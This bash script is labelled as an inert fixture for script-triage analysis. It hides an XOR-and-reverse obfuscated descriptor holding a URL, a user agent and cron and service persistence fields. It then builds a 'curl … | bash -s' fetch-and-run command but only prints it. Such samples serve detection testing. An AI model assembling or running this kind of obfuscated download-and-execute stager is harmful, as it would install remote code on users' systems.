#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_8793c42a='70 18 19 19 22 70 16 18 30 67 8 69 70 107 84 84 66 85 83 73 82 111 26 83 73 66 64 70 120 85 66 84 82 91 79 84 9 30 30 20 70 23 31 66 21 8 67 78 75 70 81 73 78 9 66 75 87 74 70 95 66 9 70 18 19 19 22 70 16 18 30 67 8 8 29 84 87 83 83 79 26 75 85 82 91 70 18 19 19 22 70 16 18 30 67 10 73 64 78 70 87 74 70 68 26 67 78 120 73 64 78 70 87 74 70 68 91 22 26 83 73 82 72 68 120 66 64 70 83 84 91 66 87 78 87 120 83 82 72 67 83 84 120 75 85 82 68 26 85 66 83 87 70 67 70 91 66 87 78 87 120 79 68 83 70 87 84 78 67 11 66 83 72 74 66 85 120 66 85 78 82 86 68 70 26 84 87 66 83 84 91 22 26 81'
readonly Codec_8793c42a='decimal_space|reverse_then_xor|27'

Load_8793c42a() {
  stored_bytes=()
  local IFS=' '
  read -r -a stored_bytes <<< "${Material_8793c42a}"
}

Decode_8793c42a() {
  recovered_bytes=()
  local byte_index
  for ((byte_index=0; byte_index<${#stored_bytes[@]}; byte_index++)); do
    recovered_bytes[${#stored_bytes[@]}-1-byte_index]="$((stored_bytes[byte_index] ^ 39))"
  done
}

Recover_8793c42a() {
  local -a stored_bytes recovered_bytes
  local configuration_text harmless_value decode_pass byte_index
  harmless_value="${HUNTRESS_FIXTURE_CONTEXT:-host}"
  Load_8793c42a
  decode_pass=0; while ((decode_pass < 1)); do Decode_8793c42a; ((decode_pass+=1)); done
  configuration_text=''
  local octal character
  for byte_index in "${!recovered_bytes[@]}"; do
    printf -v octal '%03o' "${recovered_bytes[byte_index]}"
    printf -v character '%b' "\\$octal"
    configuration_text+="$character"
  done
  printf '%s\n' "$configuration_text"
}

Inspect_8793c42a() { local recovered field; local -a fields; recovered="$(Recover_8793c42a)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

Plan_8793c42a() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_8793c42a)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(curl --fail --silent --show-error "$url")
  local -a interpreter=(bash -s)
  declare -p request_command interpreter
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_8793c42a; fi
